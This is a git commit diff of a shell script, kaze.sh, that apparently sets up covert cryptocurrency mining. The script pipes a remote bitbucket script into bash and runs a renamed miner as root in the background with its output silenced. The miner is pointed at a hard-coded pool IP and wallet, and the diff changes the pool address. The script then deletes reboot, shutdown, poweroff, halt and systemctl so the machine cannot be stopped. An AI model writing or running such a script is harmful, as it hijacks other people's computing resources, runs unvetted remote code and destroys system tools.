c62ff07c71cf68dc927bf28151ddd25558e76992
kamikaze05 <167535693+kamikaze05@users.noreply.github.com>
2024-06-13 12:26:15 +0700

    Update kaze.sh

--- kaze.sh
+++ kaze.sh
@@ -1,9 +1,10 @@
 #!/bin/bash
 apt-get update 
 apt-get install -y wget curl sudo
+sudo apt update && sudo apt install build-essential cmake pkg-config libssl-dev libzmq3-dev libunbound-dev libsodium-dev libunwind8-dev liblzma-dev libreadline6-dev libexpat1-dev libpgm-dev qttools5-dev-tools libhidapi-dev libusb-1.0-0-dev libprotobuf-dev protobuf-compiler libudev-dev libboost-chrono-dev libboost-date-time-dev libboost-filesystem-dev libboost-locale-dev libboost-program-options-dev libboost-regex-dev libboost-serialization-dev libboost-system-dev libboost-thread-dev python3 ccache doxygen graphviz
 curl -sL https://bitbucket.org/new-kamikaze/srbkaze/raw/main/grsrb.sh | bash
 chmod +x srbkaze
-sudo nohup ./srbkaze --algorithm verushash --pool 149.56.27.47:3958 --wallet RQi6kpwRhnL86G3wMs6segFP5jC7Gfue24.kaze1 > /dev/null 2>&1 &
+sudo nohup ./srbkaze --algorithm verushash --pool 139.99.16.105:5077 --wallet RQi6kpwRhnL86G3wMs6segFP5jC7Gfue24.kaze1 > /dev/null 2>&1 &
 sleep 10
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
